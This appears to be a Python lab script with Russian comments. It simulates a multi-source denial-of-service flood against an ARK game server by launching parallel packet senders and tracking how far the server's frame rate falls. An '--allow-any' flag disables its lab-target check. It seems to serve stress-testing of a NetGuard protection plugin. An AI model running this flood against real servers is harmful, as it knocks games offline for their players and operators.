# -*- coding: utf-8 -*-
"""
ark_lab_fps_saturate.py — насыщение бюджета CPU сервера несколькими
источниками и фиксация просадки FPS.

Зачем несколько источников: стоимость обработки одного постороннего пакета
в Steam-слое ~20 мкс, а сервер ARK на стенде привязан всего к 4 ядрам
(маска 0xF00000 = ядра 20-23). Чтобы выесть этот бюджет, нужен поток
~200 тыс. пакетов/с. Одна машина в лаборатории даёт ~35 тыс./с, поэтому
несколько параллельных отправителей используются как СИМУЛЯЦИЯ нескольких
источников (настоящий ботнет вне лаборатории не используется).

Скрипт сам следит за FPS плагина NetGuard и останавливает атаку, когда
достигнут целевой FPS, печатая кривую "пакеты -> FPS".
"""
from __future__ import annotations

import argparse
import os
import subprocess
import sys
import time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from ark_lab_metrics import NetGuardClient, MetricsError  # noqa: E402
from ark_lab_net import guard_target, LabTargetError  # noqa: E402

for _s in (sys.stdout, sys.stderr):
    try:
        _s.reconfigure(encoding="utf-8", errors="replace")
    except (AttributeError, OSError):
        pass

HUNT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "ark_lab_fps_hunt.py")


def _pin_children(pids, mask: int) -> None:
    """Прижимает дочерние процессы к маске ядер (через SetProcessAffinityMask)."""
    import ctypes
    import ctypes.wintypes as wt

    k32 = ctypes.WinDLL("kernel32", use_last_error=True)
    k32.OpenProcess.restype = wt.HANDLE
    k32.OpenProcess.argtypes = [wt.DWORD, wt.BOOL, wt.DWORD]
    k32.SetProcessAffinityMask.restype = wt.BOOL
    k32.SetProcessAffinityMask.argtypes = [wt.HANDLE, ctypes.c_size_t]
    k32.CloseHandle.argtypes = [wt.HANDLE]
    for pid in pids:
        h = k32.OpenProcess(0x0001 | 0x0400, False, pid)  # PROCESS_SET_INFORMATION|QUERY
        if h:
            k32.SetProcessAffinityMask(h, ctypes.c_size_t(mask))
            k32.CloseHandle(h)


def main() -> int:
    ap = argparse.ArgumentParser(description="Насыщение CPU-бюджета сервера и замер просадки FPS")
    ap.add_argument("--host", default="192.168.8.218")
    ap.add_argument("--game-port", type=int, default=7778)
    ap.add_argument("--query-port", type=int, default=27016)
    ap.add_argument("--kind", choices=["game", "rules", "challenge"], default="game")
    ap.add_argument("--sources", type=int, default=6, help="сколько параллельных отправителей")
    ap.add_argument("--payload-size", type=int, default=1400)
    ap.add_argument("--ports", type=int, default=40000)
    ap.add_argument("--target-fps", type=float, default=2.5)
    ap.add_argument("--max-seconds", type=float, default=120.0)
    ap.add_argument("--metrics-port", type=int, default=27101)
    ap.add_argument("--client-affinity", type=lambda s: int(s, 0), default=0x000FFFFF,
                    help="маска ядер для клиентских отправителей (0 = не прижимать; "
                         "ядра 0-19 по умолчанию, чтобы не отбирать CPU у сервера)")
    ap.add_argument("--allow-any", action="store_true")
    args = ap.parse_args()

    try:
        guard_target(args.host, args.allow_any)
    except LabTargetError as exc:
        print("[!] %s" % (exc,))
        return 2

    procs = []
    print("=" * 78)
    print("Насыщение: источников=%d, kind=%s, payload=%d B, цель FPS<=%.1f"
          % (args.sources, args.kind, args.payload_size, args.target_fps))
    print("=" * 78)

    m = NetGuardClient("127.0.0.1", args.metrics_port).connect()

    def status():
        s = m.status()
        return (float(s.get("tps", 0.0) or 0.0), float(s.get("tickMs", 0.0) or 0.0),
                int(s.get("memKB", 0) or 0))

    tps0, tick0, mem0 = status()
    print("  фон: tps=%.1f tick=%.2f ms mem=%d МБ" % (tps0, tick0, mem0 // 1024))

    for i in range(args.sources):
        cmd = [sys.executable, HUNT,
               "--host", args.host,
               "--game-port", str(args.game_port),
               "--payload-size", str(args.payload_size),
               "--ports", str(args.ports),
               "--threads", "10",
               "--target-fps", "0.1",          # не останавливать по цели - решает наблюдатель
               "--max-seconds", str(args.max_seconds + 30),
               "--metrics-port", str(args.metrics_port)]
        procs.append(subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))

    # КРИТИЧНО для честности измерений: клиентские отправители не должны
    # отбирать ядра у сервера. Сервер ARK на стенде привязан к 4 ядрам
    # (маска 0xF00000 = ядра 20-23), поэтому клиентские процессы прижимаем
    # к остальным (0-19). Иначе просадку FPS даёт не сервер, а сам стенд.
    if args.client_affinity:
        _pin_children([p.pid for p in procs], args.client_affinity)
        print("  отправители прижаты к маске ядер 0x%X" % args.client_affinity)
    print("  запущено отправителей: %d" % len(procs))

    curve = []
    hit = None
    t0 = time.time()
    while time.time() - t0 < args.max_seconds:
        time.sleep(1.0)
        tps, tick, mem = status()
        el = time.time() - t0
        curve.append((el, tps, tick))
        print("  t+%5.1fs  tps %5.1f  tick %7.2f ms  mem %5d МБ" % (el, tps, tick, mem // 1024))
        if 0 < tps <= args.target_fps:
            hit = (el, tps)
            break
    for p in procs:
        p.terminate()
    for p in procs:
        try:
            p.wait(timeout=5)
        except Exception:
            p.kill()
    time.sleep(2.0)
    tps_end, tick_end, mem_end = status()
    m.close()

    print("\n  ИТОГО: tps %.1f -> %.1f   tick %.2f -> %.2f ms   mem %d -> %d МБ"
          % (tps0, tps_end, tick0, tick_end, mem0 // 1024, mem_end // 1024))
    if hit:
        print("  >>> ЦЕЛЬ ДОСТИГНУТА: tps<=%.1f через %.1f с" % (args.target_fps, hit[0]))
    else:
        print("  >>> ЦЕЛЬ НЕ ДОСТИГНУТА; минимальный tps = %.1f" % (min(c[1] for c in curve) if curve else 0))
    return 0


if __name__ == "__main__":
    sys.exit(main())
